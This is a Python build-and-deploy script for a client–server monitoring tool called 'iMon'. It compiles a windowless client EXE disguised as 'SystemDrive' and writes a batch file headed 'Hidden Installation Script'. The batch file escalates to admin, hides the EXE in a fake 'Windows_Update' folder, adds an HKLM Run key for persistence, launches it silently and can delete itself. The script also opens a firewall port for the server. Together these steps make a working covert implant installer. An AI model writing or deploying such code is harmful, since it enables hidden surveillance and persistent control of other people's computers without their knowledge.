import shutil
import os
import subprocess
import socket

# This script configures the deployment and builds the client EXE.

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # doesn't even have to be reachable
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def update_client_ip(ip):
    client_file = 'client/client.py'
    with open(client_file, 'r') as file:
        lines = file.readlines()
    
    with open(client_file, 'w') as file:
        for line in lines:
            if 'SERVER_URL =' in line:
                file.write(f"SERVER_URL = 'http://{ip}:5000'\n")
            else:
                file.write(line)

def build_client():
    print("Building client executable...")
    # Using PyInstaller to build a standalone EXE
    subprocess.check_call([
        'pyinstaller', 
        '--noconsole', 
        '--onefile', 
        '--hidden-import=engineio.async_drivers.threading',
        '--hidden-import=websocket',
        '--name=SystemDrive', 
        'client/client.py'
    ])
    
    # Move to dist_package
    if not os.path.exists('dist_package'):
        os.makedirs('dist_package')
    
    shutil.move('dist/SystemDrive.exe', 'dist_package/SystemDrive.exe')
    print("Client executable created in dist_package/SystemDrive.exe")

def create_client_installer():
    installer_content = r"""@echo off
:: Hidden Installation Script

:: Check for admin rights (Required for Auto-Start Persistence)
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~0' -Verb RunAs"
    exit /b
)

:: For now, we install to Public User folder to avoid Admin prompt for file copy
:: But we need Admin for Registry (HKLM)

set "INSTALL_DIR=C:\Users\Public\Libraries\Windows_Update"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Copy the executable
copy /Y "%~dp0SystemDrive.exe" "%INSTALL_DIR%\SystemDrive.exe"

:: Add to Registry Run Key for Persistence (HKLM - All Users)
:: Requires Admin rights
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsSystemDrive" /t REG_SZ /d "%INSTALL_DIR%\SystemDrive.exe" /f

:: Start the process in the background
start "" /B "%INSTALL_DIR%\SystemDrive.exe"

:: Self-delete this installer (uncomment for production)
:: (goto) 2>nul & del "%~f0"
"""
    with open('dist_package/INSTALL_CLIENT.bat', 'w') as f:
        f.write(installer_content)
    print("Client installer created: dist_package/INSTALL_CLIENT.bat")

def setup_server_autostart():
    import sys
    print("Setting up Server Auto-Start...")
    cwd = os.getcwd()
    batch_file = os.path.join(cwd, 'RUN_SERVER.bat')
    log_file = os.path.join(cwd, 'server_log.txt')
    
    # Use absolute python path to ensure it works
    python_exe = sys.executable
    
    with open(batch_file, 'w') as f:
        # Redirect output to log file for debugging
        f.write(f'@echo off\ncd /d "{cwd}"\n"{python_exe}" server/app.py > "{log_file}" 2>&1\n')
        
    print(f"Created RUN_SERVER.bat at {batch_file}")
    print("You can double-click RUN_SERVER.bat to start the server manually.")

    
    # Add Firewall Rule for Port 5000
    print("Adding Firewall Rule for Port 5000...")
    subprocess.call('netsh advfirewall firewall delete rule name="iMonServer" dir=in', shell=True)
    subprocess.call('netsh advfirewall firewall add rule name="iMonServer" dir=in action=allow protocol=TCP localport=5000', shell=True)
    print("Firewall rule added.")

if __name__ == "__main__":
    print("--- iMon Configuration ---")
    
    # 1. Detect IP
    ip = get_ip()
    print(f"Detected Server IP: {ip}")
    user_ip = input(f"Press Enter to use {ip}, or type a different IP: ").strip()
    if user_ip:
        ip = user_ip
        
    # 2. Update Client Code
    update_client_ip(ip)
    print(f"Updated client code with IP: {ip}")
    
    # 3. Build Client
    try:
        build_client()
        create_client_installer()
    except Exception as e:
        print(f"Error building client: {e}")
        print("Make sure PyInstaller is installed (pip install pyinstaller)")
    
    # 4. Setup Server Auto-Start
    setup_server_autostart()
    
    print("\n" + "="*40)
    print("      SERVER INSTALLED SUCCESSFULLY")
    print("="*40)
    print(f"[*] Server IP Address: {ip}")
    print(f"[*] Access Dashboard at: http://{ip}:5000")
    print("-" * 40)
    print(f"[*] Client Installer: {os.path.abspath('dist_package')}")
    print("="*40)
    print("\nStarting Server now...")
    
    # Start the server immediately in a new window
    cwd = os.getcwd()
    batch_file = os.path.join(cwd, 'RUN_SERVER.bat')
    subprocess.Popen(['start', 'cmd', '/k', batch_file], shell=True)
    
    input("\nPress Enter to exit installer...")
